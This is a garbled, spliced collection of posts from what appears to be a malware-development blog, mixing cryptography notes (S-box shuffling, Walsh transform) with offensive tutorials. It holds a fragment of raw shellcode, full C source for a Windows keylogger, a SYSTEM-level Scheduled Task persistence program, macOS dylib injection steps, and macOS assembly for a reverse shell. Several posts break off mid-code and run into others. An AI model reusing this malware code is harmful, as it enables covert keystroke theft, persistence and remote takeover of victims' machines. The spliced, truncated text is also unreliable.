\"\\x01\\xd0\\x3e\\x8b\\x80\\x88\\x00\\x00\\x00\\x48\\x85\\xc0\\x74\\x6f\"\n  \"\\x48\\x01\\xd0\\x50\\x3e\\x8b\\x48\\x18\\x3e\\x44\\x8b\\x40\\x20\\x49\"\n  \"\\x01\\xd0\\xe3\\x5c\\x48\\xff\\xc9\\x3e\\x41\\x8b\\x34\\x88\\x48\\x01\"\n  \"\\xd6\\x4d\\x31\\xc9\\x48\\x31\\xc0\\xac\\x41\\xc1\\xc9\\x0d\\x41\\x01\"\n  \"\\xc1\\x38\\xe0\\x75\\xf1\\x3e\\x4c\\x03\\x4c\\x24\\x08\\x45\\x39\\xd1\"\n  \"\\x75\\xd6\\x58\\x3e\\x44\\x8b\\x40\\x24\\x49\\x01\\xd0\\x66\\x3e\\x41\"\n  \"\\x8b\\x0c\\x48\\x3e\\x44\\x8b\\x40\\x1c\\x49\\x01\\xd0\\x3e\\x41\\x8b\"\n  \"\\x04\\x88\\x48\\x01\\xd0\\x41\\x58\\x41\\x58\\x5e\\x59\\x5a\\x41\\x58\"\n  \"\\x41\\x59\\x41\\x5a\\x48\\x83\\xec\\x20\\x41\\x52\\xff\\xe0\\x58\\x41\"\n  \"\\x59\\x5a\\x3e\\x48\\x8b\\x12\\xe9\\x49"

      "content": "﷽\n\nHello, cybersecurity enthusiasts and white hackers!        \n\n     \n\nAfter reading some of my posts about cryptography, for example [this](/malware/2024/07/21/malware-cryptography-30.html) or [this](/malware/2022/08/16/malware-av-evasion-9.html), my readers had questions regarding the concepts of `sbox` generation, so I will decide to continue research cryptography in malware development, and I want to shed light on one of these tricks for generating random sboxes.     \n\nThis post is the result of my own research on implementing simplest one: Fisher-Yates shuffle trick.     \n\n### Fisher-Yates\n\nThe Fisher-Yates shuffle was first described by Ronald Fisher and Frank Yates in their 1938 book Statistical tables for biological, agricultural, and medical research. Their algorithm description was written on paper with a pencil, and the randomization was provided by a table of integers. The basic approach [described](https://en.wikipedia.org/wiki/Fisher%E2%80%93Yates_shuffle) for producing a random permutation of the numbers 1-N is as follows:\n- Write down the numbers from 1 to N.\n- Choose a random number k between one and the number of unstruck numbers left (inclusive).\n- Starting from the low end, strike out the kth number that has not yet been struck out and write it down at the conclusion of a separate list.\n- Repeat step 2 until all of the numerals are struck out.\n- The numbers typed down in step 3 are now arranged in a random order.\n\n*But what does cryptography have to do with it?*     \n\nThe reliability of some block encryption algorithms depends heavily on how \"good\" the `S-boxes` are used in their implementation: the   `S-box` (substitution box) plays a critical role in block cipher cryptography, primarily in providing non-linearity and strengthening the cipher against attacks.      \n\nA few words about non-linearity. `S-boxes` ensure that *the relationship between plaintext and ciphertext is non-linear*, which is crucial for resisting cryptanalytic attacks such as *linear cryptanalysis*. Non-linear transformations prevent patterns in the plaintext from being preserved in the ciphertext.     \n\nAlso, a well-designed `S-box` contributes to the *avalanche effect*, where a small change in the plaintext or key leads to significant changes in the ciphertext: this ensures the cipher's output appears random and makes predicting changes difficult.    \n\nIn [Feistel-based ciphers](/malware/2024/10/20/malware-cryptography-33.html) (e.g., [DES](/malware/2023/02/12/malware-av-evasion-11.html)), `S-boxes` transform the output of the Feistel function, ensuring non-linearity before combining with the plaintext.    \n\nIf we take specific examples of cryptographic algorithms, in SPN-based block ciphers (e.g., `AES`), the `S-box` is responsible for replacing input bits with unique output bits, adding confusion to the cryptographic process.     \n\nSo, as you can see, generating cryptographically secure `S-boxes` is a complex process involving mathematical techniques to ensure desirable properties like non-linearity, resistance to differential and linear cryptanalysis, and minimal correlation between input and output bits. While I can't generate truly secure `S-boxes` within this context, let's implement this shuffle algorithm based on its original specification.      \n\n### practical example\n\nLet's create simple program that implements the Fisher-Yates shuffle to generate a random permutation of `sbox[256]` and prints the results:     \n\n```cpp\n/*\n * hack.c - random sbox generation algorithms.\n * Fisher-Yates shuffle\n * Simple C implementation\n * @cocomelonc\n * https://cocomelonc.github.io/malware/2024/12/16/malware-cryptography-36.html\n */\n#include \n#include \n#include \n\n#define SBOX_SIZE 256\n\n// Fisher-Yates shuffle\nvoid fisher_yates_shuffle(unsigned char *sbox, int size) {\n  for (int i = size - 1;       "title": "Malware and cryptography 37 - Nonlinearity. Walsh Transform. Simple C example.",

      "content": "﷽\n\nHello, cybersecurity enthusiasts and white hackers!        \n\n     \n\nIn the [previous post](/malware/2024/12/16/malware-cryptography-36.html) I wrote about such a property of S blocks as nonlinearity. But how can this nonlinearity be analyzed and calculated? One of such methods is the Fourier transformation, or to be more precise, its subtype: Walsh Transformation. This post is the result of my own research on implementing Walsh Transformation.     \n\n### the Walsh transform\n\nThe Walsh transform is a mathematical transformation that measures how \"correlated\" a binary sequence is with all possible linear functions. It is widely used in cryptography to analyze the nonlinearity of cryptographic functions, such as S-boxes, which are critical for resisting linear cryptanalysis.    \n\nThe Walsh transform maps a binary sequence t into another sequence W, where each value in W indicates the \"bias\" of t towards a specific linear function. The formula for the Walsh transform is:     \n\n\\\\[ W(f)(ω) = \\sum_x{(-1)}^{f(x) \\oplus (inner product(ω,x))} \\\\]\n\n- \\\\( f(x) \\\\) - is the binary function or sequence being transformed.     \n- inner product(ω,x) - is the dot product of \\\\(ω\\\\) and \\\\(x\\\\) in binary (bitwise AND followed by XOR).     \n\nThe Walsh transform evaluates how much a binary sequence deviates from being linear. High nonlinearity is crucial for cryptographic primitives because it ensures resistance to linear cryptanalysis, a method that exploits linear relationships between input and output bits.     \n\n### measuring nonlinearity of S-boxes\n\nTo measure the nonlinearity of an `S-box` using the Walsh transform:\n\n- Transform the `S-box` into binary sequences: for each possible output bit, create binary sequences based on whether each `S-box` output bit is `0` or `1`.      \n\n- Apply Walsh transform: for each binary sequence, compute the Walsh transform.     \n\n- Evaluate Nonlinearity: The nonlinearity is the minimum Hamming distance between the sequence and all linear functions.     \n\nThis can be calculated using the Walsh transform as:     \n\n\\\\[Nonlinearity = \\frac{N}{2} - \\frac{max(abs(W(f)))}{2}\\\\] \n\nWhere, \\\\(N\\\\) is the size of the `S-box` (e.g., `N=256` for an `8`-bit `S-box`). \\\\(max⁡(∣W(f)∣)\\\\) is the maximum absolute value of the Walsh transform output.     \n\nIn other words, nonlinearity measures how far a binary sequence is from the closest linear function.    \n\n### practical example\n\nLet's create a simple program to calculate nonlinearity of custom S-boxes.     \n\nFirst of all we need function to compute binary inner product:     \n\n```cpp\nint binaryInnerProduct(int a, int b) {\n  int ip = 0;\n  int ab = a & b;\n  while (ab > 0) {\n    ip ^= (ab & 1);\n    ab >>= 1;\n  }\n  return ip;\n}\n```\n\nThis is used to evaluate linear combinations.     \n\nThen, we need Walsh transormation logic:      \n\n```cpp\n// function to compute the Walsh transform of a binary sequence\nvoid walshTransform(int* t, int len, int* wt) {\n  for (int w = 0; This is a short but interesting post about one important concept that will be demonstrated in this and the next posts in this series.     \n\n### a few words about levels of cache memory\n\nA Central Processing Unit (CPU) may have several levels of *cache memory* to store frequently accessed data and instructions. The cache memory is organized into three levels:    \n\n*L1 cache*: quickest yet smallest data and instructions.     \n*L2 cache*: slower but larger, data-only.    \n*L3 cache* - slowest but largest, data-only.     \n\nThe `lscpu` command provides detailed information about CPU architecture, features, and cache size. `lscpu` shows the L1 cache, L2 cache, and L3 cache sizes, which are crucial to processor performance and caching:    \n\n```bash\nlscpu\n```\n\n    \n\n    \n\nAs you can see, the output provides information about the size of the L1, L2, and L3 cache, CPU architecture, and total CPUs.    \n\n### cache hit and cache miss\n\nUnderstanding how the CPU cache works is crucial for performance optimization in systems programming, reverse engineering, and security research. The difference between a cache hit and a cache miss can impact the speed of execution significantly. In this blog post, we'll explore a simple C program that measures the time taken to access cached and non-cached memory locations.      \n\nThis technique is often used in security research, particularly in side-channel attacks where attackers measure access times to infer sensitive data. However, here we focus on educational and performance optimization purposes.     \n\n### practical example\n\nBefore diving into the code, let's understand what we're trying to measure:    \n**Cache Hit** - When data is already present in the `CPU` cache, access is very fast.    \n**Cache Miss** - When data needs to be fetched from `RAM`, which takes significantly longer.    \n\nIn our example, we'll:    \n1. Access a memory location that is already in the cache and measure the access time.    \n2. Flush the cache to ensure that a different memory location is not cached.    \n3. Access the new memory location and measure the time taken.    \n\nThis comparison will help us see the difference between cache hits and cache misses in real-time.    \n\nFirst of all, include necessary headers:    \n\n```cpp\n#include \n#include \n#include \n#include \n#include \n#include \n```\n\nThese headers provide functions for input/output, integer types, intrinsic functions for CPU instructions, memory management, and basic system utilities.     \n\nThen define a large array for testing:     \n\n```cpp\n#define ARRAY_SIZE (1024 * 1024)  // 1 MB array\nuint8_t array[ARRAY_SIZE];\n```\n\nWe define a `1MB` array to work with, ensuring we can access different parts and observe cache behavior.     \n\nAt the next step, let's measure memory access time:    \n\n```cpp\nuint64_t measure_access_time(volatile uint8_t *address) {\n  uint64_t start, end;\n  unsigned int aux;  // memory fence to prevent instruction reordering\n  end = __rdtscp(&aux);  // end timing\n\n  return end - start;\n}\n```\n\nThis function measures the time taken to access a specific memory address using `__rdtscp`, an `x86` instruction that reads the processor's timestamp counter.     \n\n`_mm_mfence()` - ensures that the memory operations are executed in order.     \n`__rdtscp(&aux)` - reads the timestamp before and after the memory access.     \n\nThe difference between `end` and `start` gives the cycle count taken for memory access.     \n\nThen, simulate a cache flush:     \n\n```cpp\nvoid flush_cache() {\n  // flush the cache by accessing a large amount of data\n  uint8_t *dummy = (uint8_t *)malloc(ARRAY_SIZE);\n  for (int i = 0;       "title": "Malware development: persistence - part 27. Scheduled Tasks. Simple C example.",
      "ref": "2025-03-12-malware-pers-27",
      "content": "﷽\n\nHello, cybersecurity enthusiasts and white hackers!     \n\n    \n\nI've [written](/persistence/2022/12/09/malware-pers-20.html) a lot about [various](/persistence/2023/12/10/malware-pers-23.html) [persistence](/persistence/2024/03/12/malware-pers-24.html) methods but somehow I forgot to mention one simple technique.     \n\nToday, I'm going to share another malware persistence technique: Scheduled Tasks. This is a classic method that attackers use to maintain access to a compromised system. I'll walk you through how it works, provide a proof-of-concept (PoC), and discuss some common pitfalls and fixes.     \n\n### scheduled tasks\n\n**Scheduled Tasks** is a Windows feature that allows users to automate the execution of programs or scripts at specific times or events, such as system startup or user logon. Attackers can abuse this feature to ensure their malware runs every time the system starts or a user logs in.     \n\nIn another words, the attacker creates a scheduled task that points to their malicious executable. The task is configured to run at system startup or user logon, ensuring the malware is executed persistently.    \n\n### practical example\n\nLet's start with a simple \"malware\" executable that displays a message box. This will simulate the malicious payload (`hack.c`):    \n\n```cpp\n/*\n * hack.c\n * \"malware\" for Scheduled Task\n * persistence trick\n * author: @cocomelonc\n * https://cocomelonc.github.io/malware/2025/03/12/malware-pers-27.html\n*/\n#include \n#pragma comment (lib, \"user32.lib\")\n\nint main() {\n  MessageBoxA(NULL, \"Meow-meow!!\", \"=^..^=\", MB_OK);\n  return 0;\n}\n```\n\nThis program simply displays a message box with the text `Meow-meow!!`:    \n\n```powershell\n.\\hack.exe\n```\n\nNext, we'll create a program to set up the persistence mechanism using Scheduled Tasks `pers.c`:     \n\n```cpp\n/*\n * pers.c\n * persistence via Scheduled Tasks\n * author: @cocomelonc\n * https://cocomelonc.github.io/malware/2025/03/12/malware-pers-27.html\n*/\n#include \n#include \n\nint main() {\n  // task\n  const char *taskName = \"MeowTask\";\n  const char *malwarePath = \"C:\\\\Users\\\\zhzhu\\\\Desktop\\\\hack.exe\";\n  char command[512];\n\n  snprintf(command, sizeof(command), \n       \"schtasks /create /tn \\\"%s\\\" /tr \\\"%s\\\" /sc onlogon /ru SYSTEM /rl highest /f\",\n       taskName, malwarePath);\n\n  // run command\n  int result = system(command);\n\n  if (result == 0) {\n    printf(\"task created successfully! :)\\n\");\n  } else {\n    printf(\"failed to create task. :(\\n\");\n  }\n\n  return 0;\n}\n```\n\nAs you can see, the logic is pretty simple. This program creates a scheduled task named `MeowTask` that runs `hack.exe` at user logon with the highest privileges. The task is set to run as the `SYSTEM` user.     \n\nBut this option `hack.exe` didn't work for me.       "title": "Malware development trick 46: simple Windows keylogger. Simple C example.",
      "ref": "2025-05-01-malware-tricks-46",
      "content": "﷽\n\nHello, cybersecurity enthusiasts and white hackers!        \n\n    \n\nThis post is very simple but not less important. One of my students ask about another simple trick in malware development: keylogging logic.      \n\nTo my surprise, I haven't written an article on this topic here. Sometimes you just want something simple: press a key, log it to a file, move on. Let's break it down.     \n\n### practical example\n\nI will show a simple proof-of-concept (PoC) in pure C. This tiny C keylogger uses the `WH_KEYBOARD_LL` hook to monitor keystrokes and write them to a local text file. To intercept keystrokes globally, we use:     \n\n```cpp\nhook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, NULL, 0);\n```\n\nThis sets a low-level keyboard hook. Our callback (`KeyboardProc`) is invoked every time a key is pressed.    \n\nIf `VK_ESCAPE` is pressed, we unhook and exit:    \n\n```cpp\nif (p->vkCode == VK_ESCAPE) {\n  runThread = false;\n  UnhookWindowsHookEx(hook);\n  PostQuitMessage(0);\n}\n```\n\nWe need logic to save keystrokes to a file:    \n\n```cpp\n// open file in append mode and save key\nFILE* fp = fopen(\"keylog.txt\", \"a+\");\nif (fp) {\n  DWORD key = p->vkCode;\n  fprintf(fp, \"key pressed: %c\\n\", MapVirtualKeyA(key, MAPVK_VK_TO_CHAR));\n  fclose(fp);\n}\n```\n\nNo socket exfiltration, just writing to disk. Old-school.\n\nThe standard message processing cycle usually looks like this:\n\n```cpp\nwhile (runThread && GetMessage(&msg, NULL, 0, 0)) {\n  TranslateMessage(&msg);\n  DispatchMessage(&msg);\n}\n```\n\nKeyboard events are taken from the queue using the `GetMessage` function and redirected to the `DispatchMessage` procedure, which handles messages for the window that is currently focused, using the `DispatchMessage` function.  The input focus is a property that can be given to a window made by Windows or a program. As long as the window is focused on input, all keyboard messages from the system queue will get to the right function in this window. An app can move the focus from one input window to another, like when you use `Alt+Tab` to switch to a different app:     \n\n```cpp\nBOOL GetMessage(\n  [out]          LPMSG lpMsg,\n  [in, optional] HWND  hWnd,\n  [in]           UINT  wMsgFilterMin,\n  [in]           UINT  wMsgFilterMax\n);\n\nLRESULT DispatchMessage(\n  [in] const MSG *lpMsg\n);\n```\n\nUsually, the `TranslateMessage` function is called before the `DispatchMessage` function. This function takes the `WM_KEYDOWN`, `WM_KEYUP`, `WM_SYSKEYDOWN`, and `WM_SYSKEYUP` messages as a starting point to make the \"symbolic\" messages `WM_CHAR`, `WM_SYSCHAR`, `WM_DEADCHAR`, and `WM_SYSDEADCHAR`. It is important to note that the original keyboard messages are not removed from this queue; instead, these \"symbolic\" messages are added to it:     \n\n```cpp\nBOOL TranslateMessage(\n  [in] const MSG *lpMsg\n);\n```\n\nFinal full source code of our keylogger looks like this (`hack.c`):     \n\n```cpp\n/*\n * hack.c\n * save keystrokes to file\n * author @cocomelonc\n * https://cocomelonc.github.io/malware/2025/05/01/malware-tricks-45.html\n */\n#include \n#include \n#include \n\nHHOOK hook;\nLPMSG msg;\nbool runThread = true;\n\nLRESULT CALLBACK KeyboardProc(int code, WPARAM wParam, LPARAM lParam) {\n  if (code == HC_ACTION && wParam == WM_KEYDOWN) {\n    KBDLLHOOKSTRUCT* p = (KBDLLHOOKSTRUCT*)lParam;\n\n    if (p->vkCode == VK_ESCAPE) {\n      runThread = false;\n      UnhookWindowsHookEx(hook);\n      printf(\"hooking disabled by esc key. meow =^..^=\\n\");\n      PostQuitMessage(0);\n      return 0;\n    }\n\n    // open file in append mode\n    FILE* fp = fopen(\"keylog.txt\", \"a+\");\n    if (fp) {\n      DWORD key = p->vkCode;\n      fprintf(fp, \"key pressed: %c\\n\", MapVirtualKeyA(key, MAPVK_VK_TO_CHAR));\n      fclose(fp);\n    }\n  }\n  return CallNextHookEx(hook, code, wParam, lParam);\n}\n\n// classic keylogger logic\nint main(int argc, char* argv[]) {\n  MSG msg;\n\n  // install the hook - using the WH_KEYBOARD_LL action\n  HHOOK hook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, NULL, 0);\n  if (hook == NULL) {\n    printf(\"failed to install hook :(\\n\");\n    return 1;\n  }\n\n  printf(\"hook installed. meow =^..^= press esc to stop :)\\n\");\n\n  // message loop\n  while (runThread && GetMessage(&msg, NULL, 0, 0)) {\n    TranslateMessage(&msg);\n    DispatchMessage(&msg);\n  }\n\n  return 0;\n}\n```\n\n### demo\n\nLet's go to see everything in action. Compile `hack.c`:    \n\n```bash\nx86_64-w64-mingw32-g++ hack.c -o hack.exe -I/usr/share/mingw-w64/include/ -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc -fpermissive\n```\n\n    \n\nRun `hack.exe` on the victim's Windows machine (`Windows 10 x64 22H2` in my case), type something, then press `ESC`. In this post, I'll walk you through how you can still use one of the \"classic\" injection trick into macOS. macOS is known for its strong security measures, but like every operating system, it still has some vulnerabilities that can be exploited by attackers. One such exploit, `DYLD_INSERT_LIBRARIES`, provides a powerful tool for injecting dynamic libraries (dylibs) into running applications. This trick allows attackers to tamper with macOS apps by injecting their own code, bypassing traditional security mechanisms, and stealing or manipulating sensitive data.     \n\n### the power of DYLD_INSERT_LIBRARIES\n\nA few theoretical intro words. `DYLD_INSERT_LIBRARIES` is an environment variable used to insert dynamic libraries into a running application before it loads. This is a feature built into macOS's dynamic linker (dyld). The key advantage of this technique is that it allows attackers to inject code into userland processes without needing administrative privileges or root access. The injected dylib runs with the same privileges as the targeted application, making it a powerful tool for attackers.     \n\nWhile `DYLD_INSERT_LIBRARIES` is typically used for legitimate development purposes, such as debugging and testing libraries, it *can easily be abused to inject malicious code into any running application.*    \n\n### how it works?\n\nFirst of all, the attacker sets the environment variable `DYLD_INSERT_LIBRARIES` to point to a malicious dylib. Let's say we have \"malicious\" dylib: `bad.dylib`. This can be done in the terminal with the following command:     \n\n```bash\nDYLD_INSERT_LIBRARIES=/path/to/bad.dylib \n```\n\nThen, when the application runs, the dyld linker loads the malicious dylib first, before any of the application's usual dynamic libraries. The injected code can now interact with the application’s memory, monitor its activities, or modify its behavior.     \n\n### practical example\n\nLet's break down an example of how a malicious attacker can use `DYLD_INSERT_LIBRARIES` to hijack a simple macOS application. The attacker first creates a malicious dylib that will be injected into the target application. It is designed to log the fact that it was injected.      \n\nNext, we need to choose a target macOS application. For the sake of simplicity, let’s use a basic Hello World application. Here's a simple C code for it:     \n\n```cpp\n/*\n * hello.c\n * simple mac victim app\n * author @cocomelonc\n * https://cocomelonc.github.io/macos/2025/06/19/malware-mac-2.html\n */\n#include \n\nint main() {\n  printf(\"Hello, macOS World!\\n\");\n  return 0;\n}\n```\n\nAs you can see, just print message.     \n\n### demo\n\nLet's go to see everything in action. Now, let's take things further by adding functionality to our module using parameters passed from the command line.    \n\nOne of the coolest features of kernel modules is the ability to interact with them dynamically. Instead of hardcoding values, we can expose parameters that can be modified at runtime, giving us more flexibility and control over the module's behavior.    \n\nIn this post, I'm going to show you how to pass string and integer parameters to your kernel module, and based on those parameters, you can customize the behavior of your module.     \n\n### practical example\n\nIn Linux kernel modules, you can expose parameters using the `module_param` macro. This macro allows us to declare a parameter that will be passed to the module when it is loaded.     \n\nFirst of all, look at the previous module code:    \n\n```c\n/*\n * hack.c\n * introduction to linux kernel hacking\n * author @cocomelonc\n * https://cocomelonc.github.io/linux/2025/06/23/kernel-hacking-6.html\n*/\n#include \n#include \n#include \n\nMODULE_LICENSE(\"GPL\");\nMODULE_AUTHOR(\"cocomelonc\");\nMODULE_DESCRIPTION(\"kernel-test-01\");\nMODULE_VERSION(\"0.001\");\n\nstatic int __init hack_init(void) {\n  printk(KERN_INFO \"Meow-meow!\\n\");\n  return 0;\n}\n\nstatic void __exit hack_exit(void) {\n  printk(KERN_INFO \"Meow-bow!\\n\");\n}\n\nmodule_init(hack_init);\nmodule_exit(hack_exit);\n```\n\nRecheck again, run the following command to compile the module:    \n\n```bash\nmake\n```\n\n    \n\n    \n\nand run:    \n\n```bash\nsudo insmod hack.ko\nsudo rmmod hack.ko\n```\n\n    \n\nAs you can, as in the previous post, everything is worked perfectly! (the only difference is ubuntu version: `20.04` vs `18.04`)     \n\n    \n\nOk, let's go to add some arguments to this module.      \n\nLet's break down the code and see how we can implement it. Let's say we define a string parameter called `pet` with a default value of `\"cat\"`:     \n\n```cpp\nstatic char *pet = \"cat\"; // default value is \"cat\"\nmodule_param(pet, charp, S_IRUSR | S_IWUSR);\nMODULE_PARM_DESC(pet, \"Pet name: can be cat, mice, bird, dog, or sheep\");\n```\n\n`module_param` macro declares `pet` as a parameter that can be passed to the module when it's loaded:    \n\n```cpp\nmodule_param(pet, charp, S_IRUSR | S_IWUSR)\n```\n\nHere `charp` specifies the type of the parameter (a string), `S_IRUSR | S_IWUSR` means the parameter is readable and writable by the user (the module's owner).     \n\nThen, just update kernel module initialization function (`hack_init`) logic:     \n\n```cpp\nstatic int __init hack_init(void) {\n  if (strcmp(pet, \"cat\") == 0) \"Twit-twit!\\n\");\n  } else if (strcmp(pet, \"dog\") == 0) {\n    printk(KERN_INFO \"Woof-woof!\\n\");\n  } else if (strcmp(pet, \"sheep\") == 0) {\n    printk(KERN_INFO \"Baa-baa!\\n\");\n  } else {\n    printk(KERN_INFO \"unknown pet: %s\\n\", pet);\n  }\n  return 0;\n}\n```\n\nThe logic is pretty simple: based on the value of `pet`, a different message is printed using `printk`.    \n\nWhen the module is unloaded, it logs the message `meeeeeeeeeeeeeeeooooooow!` using `printk`:      \n\n```cpp\nstatic void __exit hack_exit(void) {\n  printk(KERN_INFO \"meeeeeeeeeeeeeeeooooooow!\\n\");\n}\n```\n\nSo, final source code is looks like this (`hack2.c`):     \n\n```cpp\n/*\n * hack.c\n * kernel hacking: module params\n * author @cocomelonc\n * https://cocomelonc.github.io/linux/2025/06/23/kernel-hacking-6.html\n */\n#include \n#include \n#include \n#include \n\nMODULE_LICENSE(\"GPL\");\nMODULE_AUTHOR(\"cocomelonc\");\nMODULE_DESCRIPTION(\"kernel-test-02\");\nMODULE_VERSION(\"0.001\");\n\nstatic char *pet = \"cat\"; // default value is \"cat\"\nmodule_param(pet, charp, S_IRUSR | S_IWUSR);\nMODULE_PARM_DESC(pet, \"Pet name: can be cat, mice, bird, dog, or sheep\");\n\nstatic int __init hack_init(void) {\n  if (strcmp(pet, \"cat\") ==       "title": "MacOS hacking part 3: shellcoding. x86_64 assembly intro. Simple NASM examples",
      "ref": "2025-06-25-malware-mac-3",
      "content": "﷽\n\nHello, cybersecurity enthusiasts and white hackers!        \n\n    \n\nIn this post, we'll go over two examples of macOS `x86_64` assembly code, explaining how syscalls are used for output and executing commands directly from assembly. These examples showcase the power of low-level system calls and will be particularly helpful for those learning assembly or wanting to understand macOS (Intel) system internals better.      \n\n### practical example\n\nLet's create a simple assembly code for printing message: `Meow-meow!`     \n\nFirst of all, we need:     \n\n```nasm\nglobal start\n```\n\nThis marks the `start` label as the entry point of the program. When the code is executed, the system begins execution at this label.     \n\nAt the next step we need to writing output to `stdout`. For this we need a syscall number for `write` on macOS. In macOS, the syscall table is not readily accessible in the same way it might be in Linux. macOS uses XNU (X is Not Unix), the kernel that powers macOS, iOS, and other Apple operating systems. The syscall table is not stored in a single, easily identifiable file like in Linux, but it is part of the kernel code.     \n\n*How to find the syscall table on macOS `x86_64`?*     \n\nThe syscall table for macOS can be found in the XNU kernel source code. Specifically, it is located in the XNU source files under the `bsd` directory. For `x86_64` systems, you can explore the source code that defines the syscalls.     \n\nThe XNU kernel is open source, so I try to check the implementation of system calls by navigating through the [XNU GitHub repo](https://github.com/apple/darwin-xnu) for the latest kernel source:     \n\n    \n\nMac OS X or BSD has divided system call numbers into \"classes\":     \n\n    \n\nIf the system call is write and exit, the higher order bits are `2` because the class is `SYSCALL_CLASS_UNIX`.  All Unix system calls are `0×2000000` + unix syscall number.     \n\nWe load `0x2000004` into `rax`, which is the system call number for `write` in macOS. This syscall allows us to write data to a file descriptor (in this case, `stdout`):     \n\n```nasm\nmov rax, 0x2000004 ; write syscall number for macOS\n```\n\nThen, we pass `1` in the `rdi` register to indicate that we want to write to `stdout`. File descriptor `1` refers to `stdout`. The `rsi` register holds the address of the message we want to print. Here, the message is `\"Meow-meow!\"`, defined in the `.data` section. The `rdx` register holds the length of the message. This is dynamically calculated by subtracting the start address of `msg` from the current position (`$`), which gives the string length:    \n\n```nasm\nmov     rax, 0x2000004  ; write syscall number for macOS (Intel)\nmov     rdi, 1          ; 1 for stdout\nmov     rsi, msg        ; message to print\nmov     rdx, msg.len    ; length of the message\n```\n\nFinally, executing the syscall:      \n\n```nasm\nsyscall\n```\n\nThe kernel will take over, write the message `\"Meow-meow!\"` to `stdout`, and return control back to our program.     \n\nAt the next step we need simple normal exit from our program:     \n\n```nasm\nmov     rax, 0x2000001  ; exit syscall number\nmov     rdi, 0          ; exit status 0\nsyscall\n```\n\nAs you can see, the logic is pretty simple: we load `0x2000001` into `rax`, which is the `exit` syscall number in macOS.  The `rdi` register is used to pass the exit status. `0` typically means successful execution. Finally, the `syscall` is made to exit the program.     \n\nOf course, we added the data section:     \n\n```nasm\nsection .data\n\nmsg:    db      \"Meow-meow!\", 10\n.len:   equ     $ - msg\n```\n\nSo, full source code for this program is looks like this `meow.asm`:     \n\n```nasm\nglobal start\n\nsection .text\n\nstart:\n    mov     rax, 0x2000004 ; write syscall number for macOS\n    mov     rdi, 1          ; 1 for stdout\n    mov     rsi, msg        ; message to print\n    mov     rdx, msg.len    ; length of the message\n    syscall                 ; make the syscall\n\n    mov     rax, 0x2000001  ; exit syscall number\n    mov     rdi, 0          ; exit status 0\n    syscall                 ; make the exit syscall\n\nsection .data\n\nmsg:    db      \"Meow-meow!\", 10\n.len:   equ     $ - msg\n```\n\n### demo\n\nLet's go to compile and run this code. Copy to the MacOS VM (`macos-sonoma` in my case) and compile:     \n\n```bash\nnasm -f macho64 meow.asm -o meow.o\nld -arch x86_64 -macos_version_min 14.0 -e start -static -o meow meow.o\n```\n\n    \n\nAnd run:     \n\n```bash\n./meow\n```\n\n    \n\n    \n\nAs you can see, everything is worked perfectly as expected! =^..^=     \n\n### practical example 2\n\nLet's go to run simple shell. For this we need using `execve` to execute a shell.       "title": "MacOS hacking part 4: rev shells via x86_64 assembly. Simple NASM and C (Intel, ARM) examples",

      "content": "﷽\n\nHello, cybersecurity enthusiasts and white hackers!        \n\n    \n\nIn this article, I will walk you through an assembly code that creates a reverse shell on a macOS system using Intel `x86_64` architecture. We will go through the code step by step, explaining each part in simple terms.     \n\n### practical example\n\nLet's create a minimalist example of how malware can create a reverse shell.    \n\nFirst of all, **we need a creating socket**:     \n\n```nasm\n; socket(AF_INET, SOCK_STREAM,0);\npush 0x2             ; store 0x2 on stack\npop rdi              ; pop this value into rdi -> AF_INET\n\npush 0x1             ; store 0x1 on stack\npop rsi              ; pop this value into rsi -> SOCK_STREAM\n\nxor rdx,rdx          ; null out rdx -> 0x00\n\npush 97              ; socket() syscall - 97\npop rax\nbts rax,25\nsyscall\n```\n\nWhat's happening here? The first two push and pop instructions set up the values for the socket call. `AF_INET (0x2)` indicates the use of `IPv4`. `SOCK_STREAM (0x1)` specifies that we want a stream socket (`TCP`).     \n\nThe `xor rdx,rdx` instruction zeroes out the `rdx` register, which in this case means that we are not using any additional flags for the socket call.     \n\nFinally, the `syscall` instruction makes the `socket()` system call to create the socket.     \n\nThis step essentially sets up a socket that will later be used to establish a connection to the attacker's machine.     \n\nAt the next step, **we need to connecting to the attacker's machine**. Generally it's looks like this:     \n\n```nasm\n; connect(sockt, (struct sockaddr *) &revsockaddr,sizeof(revsockaddr));\nmov rdi,r9           ; rdi -> socket file descriptor\n\n; sockaddr\nxor rsi,rsi          ; null out rsi\npush rsi             ; sin_zero\n\nmov rsi,0x0100007F5C110201 ; 0x01 0x02 0x11 0x5C 0x0A 0x00 0x02 0x02\ndec rsi              ; sin_len = 0x00 after decrement\npush rsi\npush rsp\npop rsi\n\n;; sizeof(addr)\npush 0x10            ; place 0x10 (16) on stack\npop rdx              ; rdx -> sizeof struct -> 16 bytes -> 0x10\n\n;; syscall connect()\npush 98              ; connect() syscall - 98\npop rax\nbts rax,25\nsyscall\n```\n\nAs you can see from the first comment, `mov rdi,r9` instruction puts the socket file descriptor (`r9`) into the `rdi` register, which is the first argument for the `connect()` syscall.\n\nThen, the `xor rsi,rsi` and `push rsi` zero out the `rsi` register to represent `sin_zero` in the `sockaddr_in` structure, which is a structure for storing the `IP` address and port.\n\nFor simplicity, in this example, the IP address `0x0100007F` is `127.0.0.1` (localhost), and the port `0x5C110201` corresponds to the attacker's port `4444`.     \n\nThe `syscall` instruction makes the `connect()` system call to establish a connection with the specified IP and port.       \n\nSo, this part of the code connects the compromised machine to a remote attacker, which allows the attacker to communicate with the machine.      \n\nThen, we need to **duplicating the file descriptors (dup2)**. What does it mean in ASM code? First of all, the `dup2` syscall is used to duplicate the socket file descriptor (`r9`) for the `stdin`, `stdout`, and `stderr`. Then, code loops through the file descriptors (`2`, `1`, and `0`) and duplicates the socket into these standard input/output/error channels. Finally, the `dec rsi` and `jns dup2_loop` instructions ensure that this loop continues until all file descriptors have been duplicated.      \n\nFull source code for this part is looks like this:    \n\n```nasm\n; dup2(connfd,i)\nmov rdi,r9           ; rdi -> Socket file descriptor from r9\npush 2\npop rsi              ; rsi -> 2\ndup2_loop:\npush 90              ; dup2() syscall - 90\npop rax\nbts rax,25\nsyscall\n\ndec rsi              ; decrementing rsi by 1\njns dup2_loop        ; jump back to dup2_loop if rsi>=0\n```\n\nthis allows the attacker to control the machine via the same socket they used to connect, making the compromised system's standard input/output go through the attacker's connection.      \n\nIn the last part of our malware we need executing the `/bin/zsh` shell:     \n\n```nasm\n; execve(\"/bin/zsh\", \"/bin/zsh\", NULL);\nxor rdx,rdx          ; rdx -> 